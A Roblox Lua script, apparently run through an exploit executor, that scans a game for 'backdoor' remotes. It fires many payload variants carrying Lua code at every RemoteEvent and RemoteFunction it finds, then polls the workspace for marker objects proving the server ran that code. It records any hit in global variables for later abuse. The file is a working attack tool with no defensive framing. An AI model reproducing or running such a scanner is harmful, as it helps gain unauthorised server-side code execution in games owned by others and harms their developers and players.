
local DEBUG = true

local alphabet = {}
for i = 48, 57 do table.insert(alphabet, string.char(i)) end -- 0-9
for i = 65, 90 do table.insert(alphabet, string.char(i)) end -- A-Z
for i = 97, 122 do table.insert(alphabet, string.char(i)) end -- a-z
for _, c in ipairs({'_','-','!','@','#','$','%','^','&','*','+','=','~'}) do table.insert(alphabet, c) end

_G.backdoor = nil
_G.backdoorPath = nil
_G.backdoorFound = false

local startTime = tick()

local function printDebug(msg)
	if DEBUG then
		print("[Backdoor Scanner Log] "..msg)
	end
end

local function generateName(len)
	local name = ""
	for i = 1, len do
		name = name .. alphabet[math.random(1,#alphabet)]
	end
	return name
end

_G.fireRemote = function(remote, payload)
	if remote:IsA("RemoteEvent") then
		pcall(function() remote:FireServer(payload) end)
	elseif remote:IsA("RemoteFunction") then
		task.spawn(function() pcall(remote.InvokeServer, remote, payload) end)
	end
end

local function generateExecCode(rand)
	return [[
local sv=Instance.new("StringValue",workspace) sv.Name="]]..rand..[[" sv.Value="DETECTED"
local f=Instance.new("Folder",workspace) f.Name="]]..rand..[[_F"
local m=Instance.new("Model",workspace) m.Name="]]..rand..[[_M"
local p=Instance.new("Part",workspace) p.Name="]]..rand..[[_P" p.Size=Vector3.new(2,2,2) p.Anchored=true
local b=Instance.new("BoolValue",workspace) b.Name="]]..rand..[[_B" b.Value=true
]]
end

local function firePayloads(remote, rand, stage)
	local code = generateExecCode(rand)
	local payloads = {}

	table.insert(payloads, code)
	table.insert(payloads, {code=code})
	table.insert(payloads, {script=code})
	table.insert(payloads, {source=code})
	table.insert(payloads, {execute=code})
	table.insert(payloads, {cmd="eval", code=code})
	table.insert(payloads, {cmd="run", script=code})
	table.insert(payloads, {["code"]=code})
	table.insert(payloads, {["script"]=code})
	table.insert(payloads, {["source"]=code})
	table.insert(payloads, {["execute"]=code})
	table.insert(payloads, {["msg"]=code})
	table.insert(payloads, {["data"]=code})
	table.insert(payloads, {["load"]=code})
	table.insert(payloads, {eval=code})
	table.insert(payloads, {run=code})
	table.insert(payloads, {"", code})
	table.insert(payloads, {"run", code})
	table.insert(payloads, {"eval", code})
	table.insert(payloads, {"source", code})
	table.insert(payloads, {"execute", code})
	table.insert(payloads, {"source","scanner", code=code})
	table.insert(payloads, {["source"]="scanner", ["code"]=code})
	table.insert(payloads, {args={code}})
	table.insert(payloads, {message=code})

	if stage >= 3 then
		table.insert(payloads, {key="secret", code=code})
		table.insert(payloads, {auth=true, code=code})
		table.insert(payloads, {player=game.Players.LocalPlayer, code=code})
	end

	for _, p in ipairs(payloads) do
		task.spawn(function() _G.fireRemote(remote, p) end)
	end

	if remote:IsA("RemoteFunction") then
		task.spawn(function()
			pcall(function()
				local keys = {"","source","run","eval","code","cmd","execute","script","load","msg","data","key","auth"}
				for _, k in ipairs(keys) do
					remote:InvokeServer(k, code)
					remote:InvokeServer(k, {code=code})
					remote:InvokeServer(k, {script=code})
					remote:InvokeServer(k, {execute=code})
					remote:InvokeServer(k, {eval=code})
					remote:InvokeServer(k, {msg=code})
					remote:InvokeServer(k, {data=code})
				end
			end)
		end)
	end
end

local function scan()
	printDebug("=== Backdoor Scanner Log ===")
	printDebug("Stage 0 - Priority common/obfuscated names")

	local tests = {}
	local tested = 0
	local skipped = 0

	local rs = game:GetService("ReplicatedStorage")
	local placeId = game.PlaceId

	local common = {
		"MainRemote","Remote","Execute","Server","Backdoor","Admin","Fire","Invoke","Comm","Communication","Executor","Events","Functions",
		"re","rf","r","Event","Function","Main","RemoteEvent","RemoteFunction",
		"lh"..tostring(placeId*1337),"lh"..tostring((placeId/6666*1337*placeId)),
		"lh"..tostring(placeId*69/1884),"lh"..tostring(math.floor(placeId/10)),
		tostring(placeId*1337), tostring(placeId%10000), "r"..tostring(placeId%100000),
		"Client","ServerComm","AdminComm","ExecutorRemote"
	}

	for _, n in ipairs(common) do
		local r = rs:FindFirstChild(n) or rs:FindFirstChild(tostring(n))
		if r and (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
			local rand = generateName(math.random(22,32))
			firePayloads(r, rand, 3)
			tests[rand] = {remote=r, path=r:GetFullName()}
			tested += 1
		end
	end

	printDebug("Stage 1 - Full aggressive scan")

	local all = game:GetDescendants()
	if getnilinstances then for _, i in ipairs(getnilinstances()) do table.insert(all,i) end end
	if getinstances then for _, i in ipairs(getinstances()) do table.insert(all,i) end end
	if gethiddeninstances then for _, i in ipairs(gethiddeninstances()) do table.insert(all,i) end end

	for _, r in ipairs(all) do
		if not (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then continue end
		local fn = r:GetFullName()
		if fn:find("^RobloxReplicatedStorage") or fn:find("Players%.LocalPlayer") then skipped += 1 continue end
		if r.Name == "__FUNCTION" then skipped += 1 continue end

		local p = r.Parent    
		local pp = p and p.Parent    
		if p and p.Name == "DefaultChatSystemChatEvents" then skipped += 1 continue end    
		if pp and (pp.Name:find("HDAdmin") or pp.Name:find("Kohl") or pp.Name:find("Adonis") or pp.Name:find("Admin")) then skipped += 1 continue end    
		if p and (p:FindFirstChild("__FUNCTION") or p.Name:find("AdminCommands") or p.Name:find("Tween") or p.Name:find("Pathfinding") or p.Name:find("Chat")) then skipped += 1 continue end    

		local rand = generateName(math.random(22,32))    
		firePayloads(r, rand, 3)    
		tests[rand] = {remote=r, path=fn}    
		tested += 1
	end

	printDebug("Polling - Tested:"..tested.." Skipped:"..skipped.." Total marks:"..#tests)

	for i = 1,600 do
		for rand, info in pairs(tests) do
			local markers = {
				workspace:FindFirstChild(rand),
				workspace:FindFirstChild(rand.."_F"),
				workspace:FindFirstChild(rand.."_M"),
				workspace:FindFirstChild(rand.."_P"),
				workspace:FindFirstChild(rand.."_B")
			}
			for _, m in ipairs(markers) do
				if m then
					local detected = false
					if m:IsA("StringValue") and m.Value == "DETECTED" then detected = true
					elseif m:IsA("Folder") or m:IsA("Model") or m:IsA("Part") or (m:IsA("BoolValue") and m.Value) then detected = true end
					if detected then
						pcall(function() m:Destroy() end)
						_G.backdoor = info.remote
						_G.backdoorPath = info.path
						_G.backdoorFound = true
						printDebug(">>> BACKDOOR FOUND <<<")
						printDebug("Path: "..info.path)
						printDebug("Time: "..string.format("%.3f",tick()-startTime).."s")
						return true
					end
				end
			end
		end
		task.wait(0.025)
	end

	printDebug(">>> NO BACKDOOR <<<")
	printDebug("Finished in "..string.format("%.3f",tick()-startTime).."s")
	return false
end

task.spawn(scan)
